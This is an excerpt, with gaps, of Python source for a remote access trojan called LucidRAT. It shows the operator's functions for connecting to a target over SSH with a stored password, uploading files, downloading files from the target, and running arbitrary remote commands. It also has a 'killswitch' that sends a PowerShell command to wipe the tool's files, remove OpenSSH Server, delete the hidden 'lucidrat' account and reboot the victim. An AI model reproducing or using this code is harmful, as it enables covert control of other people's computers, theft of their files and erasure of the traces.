...
def connect(address, password):
    ...
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh lucidrat@{address}")
...
def remote_upload(address, password, upload, path):
    ...
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp {upload} lucidrat@{address}:{path}")
...
def remote_download(address, password, path):
    ...
    os.system(f"sshpass -p \"{password}\" scp -r lucidrat@{address}:{path} ~/Downloads")
...
def remote_command(address, password, command):
    ...
    os.system(f"sshpass -p \"{password}\" ssh lucidrat@{address} '{command}'")
...
def killswitch(address, password, working, username):
    print("\n[*] Prepping killswitch...")
    # web requests
    killswitch_command = f"powershell /c cd C:; Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/lucidrat\" -r -Force; Remove-LocalUser -Name \"lucidrat\"; shutdown /r"
...
def update():
    ...
    os.system("rm -rf ~/.LucidRAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[~] Update lucidrat? [y/n]\n")
        ...
        # update
        if option == "y":
            os.system(f"sh ~/.LucidRAT/payloads/update.sh")
...
def remove():
    # confirmation
    print("\n[~] Are you sure you want to remove LucidRAT [y/n]\n")
    ...
    if arguments:
        ...
        while True:
            ...
            # kill switch
                ...
                print("\n[~] Are you sure you want to remove LucidRAT from your target [y/n")
